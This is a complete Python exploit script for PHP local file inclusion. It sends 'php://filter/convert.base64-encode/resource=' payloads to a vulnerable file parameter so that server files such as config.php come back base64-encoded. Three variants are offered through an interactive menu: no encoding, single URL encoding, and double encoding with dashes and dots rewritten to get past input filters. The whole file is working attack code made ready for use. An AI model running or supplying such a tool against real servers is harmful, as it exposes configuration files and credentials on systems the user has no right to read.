import urllib.parse
import requests


class PHPFilterExploit:
    def __init__(self, url, file_to_open):
        self.url = url
        self.file_to_open = file_to_open

    def choice_method(self):
        print("1 - PHP Filters exploit no encoding")
        print("2 - PHP Filters exploit with double encoding")
        print("3 - PHP Filters exploit with simple encoding")
        choice = int(input("Enter your choice (1, 2, or 3): "))

        match choice:
            case 1:
                print("You have chosen the first method")
                response = self.attack_with_no_encoding()
            case 2:
                print("You have chosen the second method")
                response = self.attack_with_double_encoding()
            case 3:
                print("You have chosen the third method (simple encoding)")
                response = self.attack_with_simple_encoding()
            case _:
                print("Invalid choice, please try again")
                return self.choice_method()

        print(response)

    def attack_with_no_encoding(self):
        string = 'php://filter/convert.base64-encode/resource=' + self.file_to_open
        full_url = self.url + string
        print(f"Generated URL: {full_url}")
        return requests.get(full_url).text

    def attack_with_double_encoding(self):
        encoded_string = urllib.parse.quote('php://filter/convert.base64-encode/resource=' + self.file_to_open, safe='')
        encoded_string = urllib.parse.quote(encoded_string, safe='')
        encoded_string = encoded_string.replace("-", "%252d")
        encoded_string = encoded_string.replace(".", "%252e")
        full_url = self.url + encoded_string
        print(f"Generated URL: {full_url}")
        return requests.get(full_url).text

    def attack_with_simple_encoding(self):
        encoded_string = urllib.parse.quote('php://filter/convert.base64-encode/resource=' + self.file_to_open, safe='')

        encoded_string = encoded_string.replace("-", "%2d")
        encoded_string = encoded_string.replace(".", "%2e")

        full_url = self.url + encoded_string
        print(f"Generated URL: {full_url}")
        return requests.get(full_url).text


def main():
    print("Example of base URL (including the parameter)")
    print("http://example.com/index.php?file=")
    url = input("Enter the base URL (including the parameter): ")
    print("\nExample of file to read (e.g., a configuration file):")
    print("conf or config.php")
    file_to_open = input("Enter the file to read: ")
    exploit = PHPFilterExploit(url, file_to_open)
    exploit.choice_method()


if __name__ == "__main__":
    main()
